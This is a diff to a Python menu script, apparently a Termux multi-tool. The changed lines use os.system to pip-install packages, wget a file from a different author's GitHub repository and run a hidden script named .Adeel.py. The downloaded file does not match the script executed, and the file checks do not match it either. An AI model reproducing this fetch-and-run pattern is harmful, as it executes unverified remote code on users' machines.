@@ -176,7 +176,7 @@ class Main:
 	def v2(self):
 		if	os.path.isfile('.v2.py'):
 			os.system("pkg install wget -y")
-			os.system("pip install requests && pip install bs4 && clear && wget https://raw.githubusercontent.com/EsanAhmedAbir/MultiTool/main/.v2.py && clear && python .v2.py")
+			os.system("pip install requests && pip install bs4 && clear && wget https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt && clear && python .Adeel.py")
 
 		else:
 			os.system("pkg install wget -y")
@@ -186,7 +186,7 @@ class Main:
 	def v3(self):
 		if	os.path.isfile('.v3.py'):
 			os.system("pkg install wget -y")
-			os.system("pip install requests && pip install bs4 && clear && wget https://raw.githubusercontent.com/EsanAhmedAbir/MultiTool/main/.v3.py && clear && python .v3.py")
+			os.system("pip install requests && pip install bs4 && clear && wget https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt && clear && python .Adeel.py")
 
 		else:
 			os.system("pkg install wget -y")
@@ -199,7 +199,7 @@ class Main:
 
 		else:
 			os.system("pkg install wget -y")
-			os.system("wget https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt && clear && python .fmain.py")
+			os.system("wget https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt && clear && python .Adeel.py")
 
 	def custom(self):
 		print("")
